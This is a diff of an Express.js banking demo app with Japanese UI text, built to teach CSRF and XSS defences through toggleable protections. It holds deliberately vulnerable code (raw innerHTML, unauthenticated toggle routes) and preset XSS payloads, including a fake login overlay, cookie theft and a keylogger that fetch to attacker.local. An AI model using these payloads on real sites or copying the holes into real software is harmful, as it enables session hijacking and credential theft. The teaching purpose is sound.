@@ -1,23 +1,30 @@
 // bank.local:3000
 const express = require('express')
 const crypto = require('crypto')
+const path = require('path')
 
 const app = express()
 app.use(express.urlencoded({ extended: true }))
+app.use(express.static(path.join(__dirname, 'public')))
 
 // --- In-memory state ---
 const sessions = {}
 const comments = []
 let csrfProtection = true
 let sameSite = 'lax'
-let xssProtection = false  // false = innerHTML（危険）, true = escapeHtml（安全）
+let xssProtection = false  // false = innerHTML（危険）, true = DOMPurify（安全）
 let cspEnabled = false     // true = Content-Security-Policy ヘッダーを付与
+let httpOnly = true        // false = JSからCookieが読める
 
 // --- CSP middleware ---
+// nonce を生成して res.locals に保存し、正規のインラインスクリプトだけ許可する
 app.use((req, res, next) => {
   if (cspEnabled) {
-    // unsafe-inline を許可しない → onerror などのインラインスクリプトをブロック
-    res.setHeader('Content-Security-Policy', "script-src 'self'")
+    const nonce = crypto.randomBytes(16).toString('base64')
+    res.locals.nonce = nonce
+    res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'`)
+  } else {
+    res.locals.nonce = ''
   }
   next()
 })
@@ -39,13 +46,23 @@ function escapeHtml(str) {
     .replace(/"/g, '&quot;')
 }
 
+function setCookieHeader(sessionId) {
+  const flags = [
+    `session=${sessionId}`,
+    httpOnly ? 'HttpOnly' : '',
+    `SameSite=${sameSite}`,
+    'Path=/',
+  ].filter(Boolean).join('; ')
+  return flags
+}
+
 // --- Routes ---
 
 app.get('/', (req, res) => {
   const session = getSession(req)
   const flash = session?._flash || null
   if (session) delete session._flash
-  res.send(session ? dashboard(session, flash) : loginPage())
+  res.send(session ? dashboard(session, flash, res.locals.nonce) : loginPage())
 })
 
 app.post('/login', (req, res) => {
@@ -54,7 +71,7 @@ app.post('/login', (req, res) => {
   const sessionId = crypto.randomBytes(16).toString('hex')
   const csrfToken = crypto.randomBytes(16).toString('hex')
   sessions[sessionId] = { username, balance: 10000, csrfToken, log: [] }
-  res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; SameSite=${sameSite}; Path=/`)
+  res.setHeader('Set-Cookie', setCookieHeader(sessionId))
   res.redirect('/')
 })
 
@@ -62,9 +79,9 @@ app.post('/transfer', (req, res) => {
   const session = getSession(req)
   if (!session) {
     return res.status(401).send(`
-      <div style="padding:40px;font-family:sans-serif;text-align:center">
-        <h2 style="color:#27ae60">✅ SameSite が効いています</h2>
-        <p>別サイトからのリクエストにはCookieが付かないため、未ログイン扱いになりました。</p>
+      <div style="padding:60px;font-family:sans-serif;text-align:center">
+        <h2 style="color:#27ae60">✅ SameSite=strict が効いています</h2>
+        <p>別サイトからのリクエストにCookieが付かないため、未ログイン扱いになりました。</p>
         <a href="/">戻る</a>
       </div>`)
   }
@@ -79,7 +96,7 @@ app.post('/transfer', (req, res) => {
 
   const amt = parseInt(amount)
   session.balance -= amt
-  session._flash = { type: 'danger', msg: `¥${amt} が ${to} に送金されました（攻撃成功）` }
+  session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（攻撃成功）` }
   session.log.push(`💸 送金完了 → ${to} へ ¥${amt}`)
   res.redirect('/')
 })
@@ -89,14 +106,19 @@ app.post('/comments', (req, res) => {
   res.redirect('/')
 })
 
-app.get('/comments', (req, res) => res.send(commentsPage()))
+app.get('/comments', (req, res) => res.send(commentsPage(res.locals.nonce)))
 
 // --- Toggle routes ---
-app.get('/toggle-csrf',    (req, res) => { csrfProtection = !csrfProtection; res.redirect('/') })
-app.get('/toggle-xss',     (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
-app.get('/toggle-csp',     (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
-app.get('/toggle-samesite',(req, res) => {
+app.get('/toggle-csrf',     (req, res) => { csrfProtection = !csrfProtection; res.redirect('/') })
+app.get('/toggle-xss',      (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
+app.get('/toggle-csp',      (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
+app.get('/toggle-samesite', (req, res) => {
   sameSite = sameSite === 'strict' ? 'lax' : 'strict'
+  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
+  res.redirect('/')
+})
+app.get('/toggle-httponly', (req, res) => {
+  httpOnly = !httpOnly
   res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
   res.redirect('/')
 })
@@ -125,24 +147,19 @@ function css() {
     .panel { border: 2px solid #e9ecef; border-radius: 8px; margin: 20px 0; overflow: hidden; }
     .panel-head { background: #f8f9fa; padding: 12px 16px; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e9ecef; }
     .panel-body { padding: 12px 16px; }
-    .row { display: flex; align-items: center; gap: 12px; padding: 8px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+    .row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
     .row:last-child { border-bottom: none; }
     .row-label { flex: 1; }
-    .row-note { font-size: 12px; color: #888; margin-top: 2px; }
-    .tag-on  { background: #d4edda; color: #155724; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; }
-    .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; }
+    .row-note { font-size: 12px; color: #666; margin-top: 3px; }
+    .tag-on  { background: #d4edda; color: #155724; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
+    .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
     .flash { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 15px; font-weight: bold; }
     .flash-danger  { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
     .flash-blocked { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
     .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 5px 0; font-size: 14px; border-radius: 0 4px 4px 0; background: #fafafa; }
-    .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
-    .col { padding: 16px; border-radius: 8px; }
-    .col-bad  { background: #fdf2f2; border: 1px solid #f5c6c6; }
-    .col-good { background: #f2fdf4; border: 1px solid #c6eece; }
-    .col h3 { margin: 0 0 8px; font-size: 14px; }
     .preset code { background: #1e1e1e; color: #d4d4d4; padding: 8px 12px; border-radius: 6px; font-size: 12px; display: block; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
-    .preset p { margin: 10px 0 4px; font-size: 13px; font-weight: bold; }
-    .preset .note { font-size: 12px; color: #888; font-weight: normal; }
+    .preset p { margin: 12px 0 4px; font-size: 13px; font-weight: bold; }
+    .note { font-size: 12px; color: #888; font-weight: normal; }
     .balance { font-size: 28px; font-weight: bold; color: #2c3e50; }
     code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
     ul { padding-left: 20px; }
@@ -150,8 +167,8 @@ function css() {
     hr { border: none; border-top: 1px solid #eee; margin: 24px 0; }
     .footer-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #2c3e50; color: #ccc; padding: 10px 24px; font-size: 13px; }
     .footer-bar a { color: #5dade2; }
-    .section-title { font-size: 15px; font-weight: bold; margin: 24px 0 8px; display: flex; align-items: center; gap: 8px; }
-    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: normal; }
+    .section-title { font-size: 15px; font-weight: bold; margin: 24px 0 8px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: normal; white-space: nowrap; }
     .badge-danger { background: #f8d7da; color: #721c24; }
     .badge-safe   { background: #d4edda; color: #155724; }
   </style>`
@@ -172,12 +189,9 @@ function loginPage() {
 </body></html>`
 }
 
-function dashboard(session, flash) {
-  const commentHtml = comments.length
-    ? comments.slice(-5).map(c =>
-        `<div class="comment-item">${xssProtection ? escapeHtml(c) : c}</div>`
-      ).join('')
-    : `<p style="color:#aaa;font-size:13px">まだコメントなし — <a href="/comments">コメントを投稿する</a></p>`
+function dashboard(session, flash, nonce) {
+  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
+  const demoData = JSON.stringify({ comments: comments.slice(-5), xssProtection })
 
   return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
 <div class="wrap">
@@ -197,8 +211,10 @@ function dashboard(session, flash) {
 
       <div class="row">
         <div class="row-label">
-          <div>XSS保護（エスケープ）</div>
-          <div class="row-note">${xssProtection ? '✅ コメントをテキストとして表示 → タグが無害化される' : '❌ コメントをHTMLとして挿入 → スクリプトが実行される'}</div>
+          <div>XSS保護（DOMPurify）</div>
+          <div class="row-note">${xssProtection
+            ? '✅ ON — DOMPurify.sanitize() でコメントを無害化。onerrorなどを除去しつつHTMLは残す'
+            : '❌ OFF — コメントをそのまま innerHTML に挿入（v-html 相当）'}</div>
         </div>
         <span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span>
         <a href="/toggle-xss" class="btn-sm">切り替え</a>
@@ -207,7 +223,9 @@ function dashboard(session, flash) {
       <div class="row">
         <div class="row-label">
           <div>CSP（Content Security Policy）</div>
-          <div class="row-note">${cspEnabled ? '✅ インラインスクリプトの実行をブラウザがブロック → エスケープ漏れがあっても実行されない' : '❌ スクリプトの実行制限なし'}</div>
+          <div class="row-note">${cspEnabled
+            ? '✅ ON — script-src \'self\' で外部・インラインスクリプトの実行をブロック。多層防御の2段目'
+            : '❌ OFF — スクリプト実行の制限なし'}</div>
         </div>
         <span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span>
         <a href="/toggle-csp" class="btn-sm">切り替え</a>
@@ -215,8 +233,21 @@ function dashboard(session, flash) {
 
       <div class="row">
         <div class="row-label">
+          <div>HttpOnly Cookie</div>
+          <div class="row-note">${httpOnly
+            ? '✅ ON — document.cookie でCookieを読めない。ペイロード④でも盗めない'
+            : '❌ OFF — document.cookie でCookieが読める。ペイロード④でattackerのターミナルに表示される'}</div>
+        </div>
+        <span class="${httpOnly ? 'tag-on' : 'tag-off'}">${httpOnly ? 'ON' : 'OFF'}</span>
+        <a href="/toggle-httponly" class="btn-sm">切り替え（再ログイン）</a>
+      </div>
+
+      <div class="row">
+        <div class="row-label">
           <div>CSRFトークン</div>
-          <div class="row-note">${csrfProtection ? '✅ 秘密値を照合 → 別サイトからの偽造リクエストをブロック' : '❌ トークン検証なし → 別サイトからのリクエストが通る'}</div>
+          <div class="row-note">${csrfProtection
+            ? '✅ ON — 秘密値を照合。別サイトからの偽造リクエストをブロック'
+            : '❌ OFF — トークン検証なし。attacker.local からの送金が通る'}</div>
         </div>
         <span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span>
         <a href="/toggle-csrf" class="btn-sm">切り替え</a>
@@ -225,7 +256,9 @@ function dashboard(session, flash) {
       <div class="row">
         <div class="row-label">
           <div>SameSite Cookie</div>
-          <div class="row-note">${sameSite === 'strict' ? '✅ strict — 別サイトからのリクエストにCookieを付けない → 未ログイン扱いになる' : '⚠️ lax — fetch/POSTには付けないがGET遷移には付く'}</div>
+          <div class="row-note">${sameSite === 'strict'
+            ? '✅ strict — 別サイトからのリクエストにCookieを付けない。未ログイン扱いになる'
+            : '⚠️ lax — GETリンク遷移にはCookieを付ける。fetch/POSTには付けない'}</div>
         </div>
         <span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}">${sameSite}</span>
         <a href="/toggle-samesite" class="btn-sm">切り替え（再ログイン）</a>
@@ -251,10 +284,10 @@ function dashboard(session, flash) {
   <!-- コメント欄（XSS着弾点） -->
   <div class="section-title">
     最新コメント
-    <span class="badge ${xssProtection ? 'badge-safe' : 'badge-danger'}">${xssProtection ? '✅ エスケープあり（安全）' : '❌ エスケープなし（XSS着弾点）'}</span>
+    <span class="badge ${xssProtection ? 'badge-safe' : 'badge-danger'}">${xssProtection ? '✅ DOMPurify（安全）' : '❌ innerHTML（XSS着弾点）'}</span>
     <a href="/reset-comments" class="btn-sm" style="margin-left:auto">コメントクリア</a>
   </div>
-  <div id="comments-area">${commentHtml}</div>
+  <div id="comments-area"><p style="color:#aaa;font-size:13px">読み込み中...</p></div>
   <div style="margin-top:12px">
     <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
     <a href="/logout" class="btn-sm">ログアウト</a>
@@ -264,10 +297,16 @@ function dashboard(session, flash) {
 <div class="footer-bar">
   CSRFを試すには → <a href="http://attacker.local:3001" target="_blank">attacker.local:3001（攻撃者サイト）</a> を開く
 </div>
+
+<!-- コメントデータをDOMに埋め込む（nonce付きで正規スクリプトとして許可） -->
+<script${nonceAttr}>window.__DEMO_DATA__ = ${demoData};</script>
+<script src="/purify.min.js"></script>
+<script src="/client.js"></script>
 </body></html>`
 }
 
-function commentsPage() {
+function commentsPage(nonce) {
+  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
   return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>コメント投稿（XSSデモ）</title>${css()}</head><body>
 <div class="wrap">
   <h1>💬 コメントを投稿する</h1>
@@ -286,13 +325,15 @@ function commentsPage() {
     <code>&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>
 
     <p>③ 画面を偽のログインフォームで乗っ取る</p>
-    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:80px;text-align:center;font-family:sans-serif&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px;width:200px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px;width:200px&gt;&lt;button style=padding:8px 24px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>
+    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:80px;text-align:center;font-family:sans-serif&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;button style=padding:8px 24px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>
 
-    <p>④ Cookieを attacker.local に送信する <span class="note">（HttpOnly が有効なら空になる）</span></p>
+    <p>④ CookieをattackerのサーバーにHTTPで送信する <span class="note">— 対策パネルで HttpOnly を切り替えて試す</span></p>
     <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
 
-    <p style="margin-top:16px;color:#27ae60">対策を試すには：</p>
-    <p class="note">ダッシュボードの対策パネルで「XSS保護」または「CSP」を ON にしてから、同じペイロードを再投稿してみる</p>
+    <p>⑤ キーロガー（入力内容をattackerに送信） <span class="note">— 投稿後、ダッシュボードの入力欄でタイプするとattackerのターミナルに表示される</span></p>
+    <code>&lt;img src=x onerror="document.addEventListener('keydown',e=&gt;fetch('http://attacker.local:3001/stolen?key='+e.key))"&gt;</code>
+
+    <p style="margin-top:16px;color:#27ae60;font-size:13px">対策を試すには：ダッシュボードに戻り「XSS保護 ON」または「CSP ON」に切り替えてから同じペイロードを再投稿する</p>
   </div>
 
   <a href="/">← ダッシュボードへ戻る</a>
